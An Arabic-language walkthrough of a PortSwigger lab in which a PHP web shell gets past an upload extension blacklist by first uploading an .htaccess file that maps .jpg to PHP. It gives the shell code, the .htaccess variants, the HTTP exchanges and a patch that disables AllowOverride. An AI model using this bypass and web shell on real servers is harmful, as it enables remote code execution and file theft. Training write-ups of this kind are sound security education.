# [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

## **`الهدف`**
قم برفع ملف `PHP Web Shell` بسيط واستخدمه لاستخراج محتويات ملف `/home/carlos/secret` ثم قم بتقديمه كـ `Solutiom`.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` بعد ذلك سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونضع بداخله الكود التالي ونقوم بحفظه بصيغة `php` وأى اسم عشوائي مثل `TESTTEST`:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب.
ولكن سنلاحظ وجود رسالة خطأ في المتصفح والاستجابة
```http
HTTP/2 403 Forbidden
Date: Mon, 28 Sep 2026 20:35:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 164

Sorry, php files are not allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```
ولكن سنلاحظ كذلك أن السيرفر من نوع `Apache` لذلك سنقوم سنقوم بعمل ملف نصي على الجهاز باستخدام أى برنامج تحرير نصوص ونقوم بحفظه باسم `.htaccess`
ثم سنقوم بوضع داخله إحدى السطور الأتية 
```htaccess
AddType application/x-httpd-php .jpg
OR
AddHandler application/x-httpd-php .jpg
OR
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
OR
<IfModule mod_mime.c>
    AddType application/x-httpd-php .jpg
    AddHandler application/x-httpd-php .jpg
</IfModule>
```
وسبب وجود عدة أوامر هو بسبب إختلاف طريقة الإعداد الداخلي للسيرفرات، لذلك يمكننا أن نجربهم بالتوالي، ولكن في هذا اللاب الأمر الأول كان ناجحًا.

وهذه الأوامر تجعل السيرفر يقوم بالتعامل وتشغيل أى ملف بامتداد`.jpg`كأنه ملف `php،` وليس شرطًا `.jpg` حيث يمكننا وضع أى امتداد في السطور ولكن بشرط أن يكون الامتداد متطابق مع امتداد الملف الذي سنرفعه في الخطوة التالية:

والأن سنقوم بتعديل امتداد ملف `TESTTEST` من `php` إلى `jpg`.

بعد ذلك سنقوم برفعه باستخدام خاصية رفع الـ `Avatar` داخل اللاب
وبمجرد اتمام الرفع وعمل تجديد لصفحة `My account` سنجد في الـ `HTTP history` الطلب التالي والذي يستدعي الملف تلقائيًا:
```http
GET /files/avatars/TESTTEST.jpg HTTP/2
Host: 0acc00fb03be0e998232a24f00f9009c.web-security-academy.net
Cookie: session=QwnNq1g6xla1eAiqWYVuxaqRgYizg2R0
```

وبفحص الاستجابة سنجد بداخلها الـ `Secret` المطلوب
```http
HTTP/2 200 OK
Date: Mon, 28 Sep 2026 20:47:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

mXpHnRhFis7neZdYAn0PhhqoRN8IAj2W
```

بعد ذلك سنقوم بنسخه ثم نعود للصفحة الرئيسية للاب ونضغط على  `Submit solution` ونضعه في الحقل ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Remote code execution via web shell upload](./Remote-code-execution-via-web-shell-upload.md)

ويجب على المبرمجين ضبط الإعدادات الرئيسية للسيرفر لمنعه من الالتفات لملفات الـ `.htaccess` التي يرفعها المستخدمين عن طريق إلغاء خاصية `AllowOverride` داخل المجلدات التي يستطيع المستخدمين رفع ملفاتهم إليها:
```htaccess
<Directory /files>
    AllowOverride None
</Directory>
```
